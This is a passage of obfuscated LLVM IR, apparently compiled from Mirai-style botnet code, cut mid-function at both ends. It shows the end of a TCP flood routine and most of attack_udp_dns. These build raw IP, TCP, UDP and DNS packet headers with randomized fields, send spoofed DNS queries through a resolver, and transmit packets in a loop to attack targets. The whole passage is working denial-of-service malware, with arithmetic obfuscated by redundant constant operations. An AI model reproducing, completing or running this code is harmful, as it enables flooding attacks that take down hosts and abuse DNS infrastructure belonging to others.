  %466 = load i8, i8* %465, align 4
  %467 = zext i8 %466 to i32
  %468 = lshr i32 %460, %467
  %469 = add i32 %459, 119737527
  %470 = add i32 %469, %468
  %471 = sub i32 %470, 119737527
  %472 = add i32 %459, %468
  %473 = call i32 @htonl(i32 %471) #7
  %474 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %475 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %474, i32 0, i32 9
  store i32 %473, i32* %475, align 4
  br label %476

; <label>:476:                                    ; preds = %452, %430
  %477 = load i32, i32* %28, align 4
  %478 = icmp eq i32 %477, -1
  br i1 %478, label %479, label %483

; <label>:479:                                    ; preds = %476
  %480 = call i32 @rand_next()
  %481 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 8
  store i32 %480, i32* %482, align 4
  br label %483

; <label>:483:                                    ; preds = %479, %476
  %484 = load i16, i16* %13, align 2
  %485 = zext i16 %484 to i32
  %486 = icmp eq i32 %485, 65535
  br i1 %486, label %487, label %496

; <label>:487:                                    ; preds = %483
  %488 = call i32 @rand_next()
  %489 = xor i32 65535, -1
  %490 = xor i32 %488, %489
  %491 = and i32 %490, %488
  %492 = and i32 %488, 65535
  %493 = trunc i32 %491 to i16
  %494 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 3
  store i16 %493, i16* %495, align 4
  br label %496

; <label>:496:                                    ; preds = %487, %483
  %497 = load i16, i16* %16, align 2
  %498 = zext i16 %497 to i32
  %499 = icmp eq i32 %498, 65535
  br i1 %499, label %500, label %509

; <label>:500:                                    ; preds = %496
  %501 = call i32 @rand_next()
  %502 = xor i32 65535, -1
  %503 = xor i32 %501, %502
  %504 = and i32 %503, %501
  %505 = and i32 %501, 65535
  %506 = trunc i32 %504 to i16
  %507 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 0
  store i16 %506, i16* %508, align 4
  br label %509

; <label>:509:                                    ; preds = %500, %496
  %510 = load i16, i16* %17, align 2
  %511 = zext i16 %510 to i32
  %512 = icmp eq i32 %511, 65535
  br i1 %512, label %513, label %526

; <label>:513:                                    ; preds = %509
  %514 = call i32 @rand_next()
  %515 = xor i32 %514, -1
  %516 = xor i32 65535, -1
  %517 = xor i32 -1530166253, -1
  %518 = or i32 %515, %516
  %519 = or i32 -1530166253, %517
  %520 = xor i32 %518, -1
  %521 = and i32 %520, %519
  %522 = and i32 %514, 65535
  %523 = trunc i32 %521 to i16
  %524 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %525 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %524, i32 0, i32 1
  store i16 %523, i16* %525, align 2
  br label %526

; <label>:526:                                    ; preds = %513, %509
  %527 = load i32, i32* %18, align 4
  %528 = icmp eq i32 %527, 65535
  br i1 %528, label %529, label %533

; <label>:529:                                    ; preds = %526
  %530 = call i32 @rand_next()
  %531 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 2
  store i32 %530, i32* %532, align 4
  br label %533

; <label>:533:                                    ; preds = %529, %526
  %534 = load i32, i32* %19, align 4
  %535 = icmp eq i32 %534, 65535
  br i1 %535, label %536, label %540

; <label>:536:                                    ; preds = %533
  %537 = call i32 @rand_next()
  %538 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 3
  store i32 %537, i32* %539, align 4
  br label %540

; <label>:540:                                    ; preds = %536, %533
  %541 = load i8, i8* %27, align 1
  %542 = icmp ne i8 %541, 0
  br i1 %542, label %543, label %546

; <label>:543:                                    ; preds = %540
  %544 = load i8*, i8** %35, align 8
  %545 = load i32, i32* %26, align 4
  call void @rand_str(i8* %544, i32 %545)
  br label %546

; <label>:546:                                    ; preds = %543, %540
  %547 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %548 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %547, i32 0, i32 7
  store i16 0, i16* %548, align 2
  %549 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %550 = bitcast %struct.iphdr* %549 to i16*
  %551 = call zeroext i16 @checksum_generic(i16* %550, i32 20)
  %552 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %553 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %552, i32 0, i32 7
  store i16 %551, i16* %553, align 2
  %554 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 6
  store i16 0, i16* %555, align 4
  %556 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %557 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %558 = bitcast %struct.tcphdr* %557 to i8*
  %559 = load i32, i32* %26, align 4
  %560 = sext i32 %559 to i64
  %561 = sub i64 20, -8251493224927612877
  %562 = add i64 %561, %560
  %563 = add i64 %562, -8251493224927612877
  %564 = add i64 20, %560
  %565 = trunc i64 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #7
  %567 = load i32, i32* %26, align 4
  %568 = sext i32 %567 to i64
  %569 = sub i64 0, 20
  %570 = sub i64 0, %568
  %571 = add i64 %569, %570
  %572 = sub i64 0, %571
  %573 = add i64 20, %568
  %574 = trunc i64 %572 to i32
  %575 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %556, i8* %558, i16 zeroext %566, i32 %574)
  %576 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 6
  store i16 %575, i16* %577, align 4
  %578 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 1
  %580 = load i16, i16* %579, align 2
  %581 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %582 = load i32, i32* %9, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %581, i64 %583
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i32 0, i32 0
  %586 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %585, i32 0, i32 1
  store i16 %580, i16* %586, align 2
  %587 = load i32, i32* %10, align 4
  %588 = load i8*, i8** %32, align 8
  %589 = load i32, i32* %26, align 4
  %590 = sext i32 %589 to i64
  %591 = add i64 40, 2063852959093144934
  %592 = add i64 %591, %590
  %593 = sub i64 %592, 2063852959093144934
  %594 = add i64 40, %590
  %595 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %596 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %597 = load i32, i32* %9, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i64 %598
  %600 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i32 0, i32 0
  %601 = bitcast %struct.sockaddr_in* %600 to %struct.sockaddr*
  store %struct.sockaddr* %601, %struct.sockaddr** %595, align 8
  %602 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %603 = load %struct.sockaddr*, %struct.sockaddr** %602, align 8
  %604 = call i64 @sendto(i32 %587, i8* %588, i64 %593, i32 16384, %struct.sockaddr* %603, i32 16)
  br label %605

; <label>:605:                                    ; preds = %546
  %606 = load i32, i32* %9, align 4
  %607 = sub i32 0, 1
  %608 = sub i32 %606, %607
  %609 = add nsw i32 %606, 1
  store i32 %608, i32* %9, align 4
  br label %425

; <label>:610:                                    ; preds = %425
  br label %424

; <label>:611:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca [256 x i8*], align 16
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca %struct.dnshdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %39 = load i8, i8* %5, align 1
  %40 = zext i8 %39 to i64
  %41 = call noalias i8* @calloc(i64 %40, i64 8) #6
  %42 = bitcast i8* %41 to i8**
  store i8** %42, i8*** %11, align 8
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 2, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %12, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 3, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %13, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 4, i32 64)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %14, align 1
  %55 = load i8, i8* %7, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 5, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %7, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 6, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %7, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 7, i32 53)
  %66 = trunc i32 %65 to i16
  store i16 %66, i16* %17, align 2
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 9, i32 65535)
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %18, align 2
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 0, i32 1458)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %19, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i8* @attack_get_opt_str(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 8, i8* null)
  store i8* %77, i8** %20, align 8
  %78 = call i32 @get_dns_resolver()
  store i32 %78, i32* %22, align 4
  %79 = load i8*, i8** %20, align 8
  %80 = icmp eq i8* %79, null
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %4
  br label %514

; <label>:82:                                     ; preds = %4
  %83 = load i8*, i8** %20, align 8
  %84 = call i32 @util_strlen(i8* %83)
  store i32 %84, i32* %21, align 4
  %85 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %85, i32* %10, align 4
  %86 = icmp eq i32 %85, -1
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %82
  br label %514

; <label>:88:                                     ; preds = %82
  store i32 1, i32* %9, align 4
  %89 = load i32, i32* %10, align 4
  %90 = bitcast i32* %9 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %96

; <label>:93:                                     ; preds = %88
  %94 = load i32, i32* %10, align 4
  %95 = call i32 @close(i32 %94)
  br label %514

; <label>:96:                                     ; preds = %88
  store i32 0, i32* %9, align 4
  br label %97

; <label>:97:                                     ; preds = %325, %96
  %98 = load i32, i32* %9, align 4
  %99 = load i8, i8* %5, align 1
  %100 = zext i8 %99 to i32
  %101 = icmp slt i32 %98, %100
  br i1 %101, label %102, label %330

; <label>:102:                                    ; preds = %97
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %103 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %104 = load i8**, i8*** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %104, i64 %106
  store i8* %103, i8** %107, align 8
  %108 = load i8**, i8*** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8*, i8** %108, i64 %110
  %112 = load i8*, i8** %111, align 8
  %113 = bitcast i8* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %26, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %27, align 8
  %117 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %118 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %117, i64 1
  %119 = bitcast %struct.udphdr* %118 to %struct.dnshdr*
  store %struct.dnshdr* %119, %struct.dnshdr** %28, align 8
  %120 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %121 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %120, i64 1
  %122 = bitcast %struct.dnshdr* %121 to i8*
  store i8* %122, i8** %29, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %124 = bitcast %struct.iphdr* %123 to i8*
  %125 = load i8, i8* %124, align 4
  %126 = xor i8 %125, -1
  %127 = xor i8 15, -1
  %128 = xor i8 -116, -1
  %129 = or i8 %126, %127
  %130 = or i8 -116, %128
  %131 = xor i8 %129, -1
  %132 = and i8 %131, %130
  %133 = and i8 %125, 15
  %134 = xor i8 %132, -1
  %135 = xor i8 64, -1
  %136 = xor i8 -12, -1
  %137 = and i8 %134, -12
  %138 = and i8 %132, %136
  %139 = and i8 %135, -12
  %140 = and i8 64, %136
  %141 = or i8 %137, %138
  %142 = or i8 %139, %140
  %143 = xor i8 %141, %142
  %144 = or i8 %134, %135
  %145 = xor i8 %144, -1
  %146 = or i8 -12, %136
  %147 = and i8 %145, %146
  %148 = or i8 %143, %147
  %149 = or i8 %132, 64
  store i8 %148, i8* %124, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %151 = bitcast %struct.iphdr* %150 to i8*
  %152 = load i8, i8* %151, align 4
  %153 = xor i8 %152, -1
  %154 = xor i8 -16, -1
  %155 = xor i8 40, -1
  %156 = or i8 %153, %154
  %157 = or i8 40, %155
  %158 = xor i8 %156, -1
  %159 = and i8 %158, %157
  %160 = and i8 %152, -16
  %161 = and i8 %159, 5
  %162 = xor i8 %159, 5
  %163 = or i8 %161, %162
  %164 = or i8 %159, 5
  store i8 %163, i8* %151, align 4
  %165 = load i8, i8* %12, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 1
  store i8 %165, i8* %167, align 1
  %168 = load i8, i8* %19, align 1
  %169 = zext i8 %168 to i64
  %170 = add i64 41, -2787750455089323775
  %171 = add i64 %170, %169
  %172 = sub i64 %171, -2787750455089323775
  %173 = add i64 41, %169
  %174 = sub i64 0, 2
  %175 = sub i64 %172, %174
  %176 = add i64 %172, 2
  %177 = load i32, i32* %21, align 4
  %178 = sext i32 %177 to i64
  %179 = add i64 %175, -2961183191211033308
  %180 = add i64 %179, %178
  %181 = sub i64 %180, -2961183191211033308
  %182 = add i64 %175, %178
  %183 = sub i64 %181, 1314473396744477513
  %184 = add i64 %183, 4
  %185 = add i64 %184, 1314473396744477513
  %186 = add i64 %181, 4
  %187 = trunc i64 %185 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 2
  store i16 %188, i16* %190, align 2
  %191 = load i16, i16* %13, align 2
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 3
  store i16 %192, i16* %194, align 4
  %195 = load i8, i8* %14, align 1
  %196 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 5
  store i8 %195, i8* %197, align 4
  %198 = load i8, i8* %15, align 1
  %199 = icmp ne i8 %198, 0
  br i1 %199, label %200, label %204

; <label>:200:                                    ; preds = %102
  %201 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %202 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 4
  store i16 %201, i16* %203, align 2
  br label %204

; <label>:204:                                    ; preds = %200, %102
  %205 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 6
  store i8 17, i8* %206, align 1
  %207 = load i32, i32* @LOCAL_ADDR, align 4
  %208 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 8
  store i32 %207, i32* %209, align 4
  %210 = load i32, i32* %22, align 4
  %211 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 9
  store i32 %210, i32* %212, align 4
  %213 = load i16, i16* %16, align 2
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %216 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %215, i32 0, i32 0
  store i16 %214, i16* %216, align 2
  %217 = load i16, i16* %17, align 2
  %218 = call zeroext i16 @htons(i16 zeroext %217) #7
  %219 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %220 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %219, i32 0, i32 1
  store i16 %218, i16* %220, align 2
  %221 = load i8, i8* %19, align 1
  %222 = zext i8 %221 to i64
  %223 = add i64 21, -3129233616654280944
  %224 = add i64 %223, %222
  %225 = sub i64 %224, -3129233616654280944
  %226 = add i64 21, %222
  %227 = sub i64 0, 2
  %228 = sub i64 %225, %227
  %229 = add i64 %225, 2
  %230 = load i32, i32* %21, align 4
  %231 = sext i32 %230 to i64
  %232 = sub i64 %228, 7523408719789055510
  %233 = add i64 %232, %231
  %234 = add i64 %233, 7523408719789055510
  %235 = add i64 %228, %231
  %236 = sub i64 %234, -7015273836355977281
  %237 = add i64 %236, 4
  %238 = add i64 %237, -7015273836355977281
  %239 = add i64 %234, 4
  %240 = trunc i64 %238 to i16
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 2
  store i16 %241, i16* %243, align 2
  %244 = load i16, i16* %18, align 2
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %247 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %246, i32 0, i32 0
  store i16 %245, i16* %247, align 2
  %248 = call zeroext i16 @htons(i16 zeroext 256) #7
  %249 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %250 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %249, i32 0, i32 1
  store i16 %248, i16* %250, align 2
  %251 = call zeroext i16 @htons(i16 zeroext 1) #7
  %252 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %253 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i8, i8* %19, align 1
  %255 = load i8*, i8** %29, align 8
  %256 = getelementptr inbounds i8, i8* %255, i32 1
  store i8* %256, i8** %29, align 8
  store i8 %254, i8* %255, align 1
  %257 = load i8, i8* %19, align 1
  %258 = zext i8 %257 to i32
  %259 = load i8*, i8** %29, align 8
  %260 = sext i32 %258 to i64
  %261 = getelementptr inbounds i8, i8* %259, i64 %260
  store i8* %261, i8** %29, align 8
  %262 = load i8*, i8** %29, align 8
  store i8* %262, i8** %30, align 8
  %263 = load i8*, i8** %29, align 8
  %264 = getelementptr inbounds i8, i8* %263, i64 1
  %265 = load i8*, i8** %20, align 8
  %266 = load i32, i32* %21, align 4
  %267 = add i32 %266, 2035341979
  %268 = add i32 %267, 1
  %269 = sub i32 %268, 2035341979
  %270 = add nsw i32 %266, 1
  call void @util_memcpy(i8* %264, i8* %265, i32 %269)
  store i32 0, i32* %23, align 4
  br label %271

; <label>:271:                                    ; preds = %303, %204
  %272 = load i32, i32* %23, align 4
  %273 = load i32, i32* %21, align 4
  %274 = icmp slt i32 %272, %273
  br i1 %274, label %275, label %310

; <label>:275:                                    ; preds = %271
  %276 = load i8*, i8** %20, align 8
  %277 = load i32, i32* %23, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8, i8* %276, i64 %278
  %280 = load i8, i8* %279, align 1
  %281 = sext i8 %280 to i32
  %282 = icmp eq i32 %281, 46
  br i1 %282, label %283, label %297

; <label>:283:                                    ; preds = %275
  %284 = load i8, i8* %24, align 1
  %285 = load i8*, i8** %30, align 8
  store i8 %284, i8* %285, align 1
  store i8 0, i8* %24, align 1
  %286 = load i8, i8* %25, align 1
  %287 = sub i8 0, %286
  %288 = sub i8 0, 1
  %289 = add i8 %287, %288
  %290 = sub i8 0, %289
  %291 = add i8 %286, 1
  store i8 %290, i8* %25, align 1
  %292 = load i8*, i8** %29, align 8
  %293 = load i32, i32* %23, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds i8, i8* %292, i64 %294
  %296 = getelementptr inbounds i8, i8* %295, i64 1
  store i8* %296, i8** %30, align 8
  br label %302

; <label>:297:                                    ; preds = %275
  %298 = load i8, i8* %24, align 1
  %299 = sub i8 0, 1
  %300 = sub i8 %298, %299
  %301 = add i8 %298, 1
  store i8 %300, i8* %24, align 1
  br label %302

; <label>:302:                                    ; preds = %297, %283
  br label %303

; <label>:303:                                    ; preds = %302
  %304 = load i32, i32* %23, align 4
  %305 = sub i32 0, %304
  %306 = sub i32 0, 1
  %307 = add i32 %305, %306
  %308 = sub i32 0, %307
  %309 = add nsw i32 %304, 1
  store i32 %308, i32* %23, align 4
  br label %271

; <label>:310:                                    ; preds = %271
  %311 = load i8, i8* %24, align 1
  %312 = load i8*, i8** %30, align 8
  store i8 %311, i8* %312, align 1
  %313 = load i8*, i8** %29, align 8
  %314 = load i32, i32* %21, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds i8, i8* %313, i64 %315
  %317 = getelementptr inbounds i8, i8* %316, i64 2
  %318 = bitcast i8* %317 to %struct.grehdr*
  store %struct.grehdr* %318, %struct.grehdr** %31, align 8
  %319 = call zeroext i16 @htons(i16 zeroext 1) #7
  %320 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %321 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %320, i32 0, i32 0
  store i16 %319, i16* %321, align 2
  %322 = call zeroext i16 @htons(i16 zeroext 1) #7
  %323 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %324 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  br label %325

; <label>:325:                                    ; preds = %310
  %326 = load i32, i32* %9, align 4
  %327 = sub i32 0, 1
  %328 = sub i32 %326, %327
  %329 = add nsw i32 %326, 1
  store i32 %328, i32* %9, align 4
  br label %97

; <label>:330:                                    ; preds = %97
  br label %331

; <label>:331:                                    ; preds = %513, %330
  store i32 0, i32* %9, align 4
  br label %332

; <label>:332:                                    ; preds = %507, %331
  %333 = load i32, i32* %9, align 4
  %334 = load i8, i8* %5, align 1
  %335 = zext i8 %334 to i32
  %336 = icmp slt i32 %333, %335
  br i1 %336, label %337, label %513

; <label>:337:                                    ; preds = %332
  %338 = bitcast [256 x i8*]* %32 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %338, i8* bitcast ([256 x i8*]* @attack_udp_dns.dns_array to i8*), i64 2048, i32 16, i1 false)
  %339 = call i32 @rand() #6
  %340 = srem i32 %339, 256
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds [256 x i8*], [256 x i8*]* %32, i64 0, i64 %341
  %343 = load i8*, i8** %342, align 8
  store i8* %343, i8** %33, align 8
  %344 = load i8*, i8** %33, align 8
  %345 = bitcast i8* %344 to %struct.iphdr*
  store %struct.iphdr* %345, %struct.iphdr** %34, align 8
  %346 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i64 1
  %348 = bitcast %struct.iphdr* %347 to %struct.udphdr*
  store %struct.udphdr* %348, %struct.udphdr** %35, align 8
  %349 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %350 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %349, i64 1
  %351 = bitcast %struct.udphdr* %350 to %struct.dnshdr*
  store %struct.dnshdr* %351, %struct.dnshdr** %36, align 8
  %352 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %353 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %352, i64 1
  %354 = bitcast %struct.dnshdr* %353 to i8*
  %355 = getelementptr inbounds i8, i8* %354, i64 1
  store i8* %355, i8** %37, align 8
  %356 = load i16, i16* %13, align 2
  %357 = zext i16 %356 to i32
  %358 = icmp eq i32 %357, 65535
  br i1 %358, label %359, label %372

; <label>:359:                                    ; preds = %337
  %360 = call i32 @rand_next()
  %361 = xor i32 %360, -1
  %362 = xor i32 65535, -1
  %363 = xor i32 454103941, -1
  %364 = or i32 %361, %362
  %365 = or i32 454103941, %363
  %366 = xor i32 %364, -1
  %367 = and i32 %366, %365
  %368 = and i32 %360, 65535
  %369 = trunc i32 %367 to i16
  %370 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %371 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %370, i32 0, i32 3
  store i16 %369, i16* %371, align 4
  br label %372

; <label>:372:                                    ; preds = %359, %337
  %373 = load i16, i16* %16, align 2
  %374 = zext i16 %373 to i32
  %375 = icmp eq i32 %374, 65535
  br i1 %375, label %376, label %385

; <label>:376:                                    ; preds = %372
  %377 = call i32 @rand_next()
  %378 = xor i32 65535, -1
  %379 = xor i32 %377, %378
  %380 = and i32 %379, %377
  %381 = and i32 %377, 65535
  %382 = trunc i32 %380 to i16
  %383 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %384 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %383, i32 0, i32 0
  store i16 %382, i16* %384, align 2
  br label %385

; <label>:385:                                    ; preds = %376, %372
  %386 = load i16, i16* %17, align 2
  %387 = zext i16 %386 to i32
  %388 = icmp eq i32 %387, 65535
  br i1 %388, label %389, label %398

; <label>:389:                                    ; preds = %385
  %390 = call i32 @rand_next()
  %391 = xor i32 65535, -1
  %392 = xor i32 %390, %391
  %393 = and i32 %392, %390
  %394 = and i32 %390, 65535
  %395 = trunc i32 %393 to i16
  %396 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 1
  store i16 %395, i16* %397, align 2
  br label %398

; <label>:398:                                    ; preds = %389, %385
  %399 = load i16, i16* %18, align 2
  %400 = zext i16 %399 to i32
  %401 = icmp eq i32 %400, 65535
  br i1 %401, label %402, label %415

; <label>:402:                                    ; preds = %398
  %403 = call i32 @rand_next()
  %404 = xor i32 %403, -1
  %405 = xor i32 65535, -1
  %406 = xor i32 -121632391, -1
